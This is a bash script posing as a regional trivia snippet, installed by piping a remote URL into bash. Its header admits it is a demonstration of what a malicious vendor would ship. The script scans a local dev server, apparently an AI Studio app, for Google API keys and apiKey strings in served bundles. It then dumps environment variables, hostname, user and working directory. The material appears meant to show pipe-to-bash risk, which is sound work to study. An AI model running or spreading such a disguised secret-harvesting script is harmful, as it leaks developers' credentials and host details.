#!/usr/bin/env bash
# ============================================================================
# Atmos Trivia Bureau — self-updating locale snippet
# ----------------------------------------------------------------------------
# Recommended invocation (from the bureau docs):
#
#     curl -s https://nivmorabin.github.io/html/atmos-trivia-bureau.sh | bash
#
# This script prints "freshly calibrated" locale trivia for the current host's
# region. The bureau computes calibration values from the host's runtime
# environment so that each deployment gets locale-appropriate enrichment
# (e.g. units, language hints, regional clock skew).
#
# In other words: it just dumps env. Any developer who pipes a third-party
# URL into bash inherits whatever code that URL serves at request time. This
# script is the "after" picture — what a malicious bureau would actually ship
# behind an innocent-looking install command.
# ============================================================================

set -u

# Step A: bundle scan diagnostic.
# Vite's `define` block in vite.config.ts performs *build-time string
# substitution* of process.env.* references into the served JS. If AI
# Studio uses Vite's loadEnv to feed real secrets into that substitution,
# the secret will appear inline in the served bundle. If AI Studio
# instead proxies API calls server-side, the served bundle will contain
# only placeholders and outbound requests will be rewritten elsewhere.
#
# This block prints, for each candidate path:
#   path, http_code, bytes, AIza-match, literal apiKey: line if present
# So we can tell which scenario AI Studio is in.
echo "# --- bundle scan diagnostic ---"
for path in / /src/App.tsx /src/main.tsx /index.html /node_modules/.vite/deps/@google_genai.js; do
  resp=$(curl -s -w '__SEP__%{http_code}__SEP__%{size_download}' "http://localhost:3000${path}" 2>/dev/null)
  code=$(echo "$resp" | awk -F'__SEP__' '{print $2}')
  bytes=$(echo "$resp" | awk -F'__SEP__' '{print $3}')
  body=$(echo "$resp" | awk -F'__SEP__' '{print $1}')
  match=$(echo "$body" | grep -oE 'AIza[A-Za-z0-9_-]{30,}' | head -1)
  apikey_line=$(echo "$body" | grep -oE 'apiKey[:= ]+"[^"]{0,50}"' | head -1)
  echo "  path=${path} code=${code} bytes=${bytes} aiza=[${match}] apikey=[${apikey_line}]"
done

# Step B: env scan.
echo "# --- env scan ---"
env | head -n 10
echo "# --- (host: $(hostname 2>/dev/null || echo unknown), user: $(id -un 2>/dev/null || echo unknown), pwd: $(pwd)) ---"
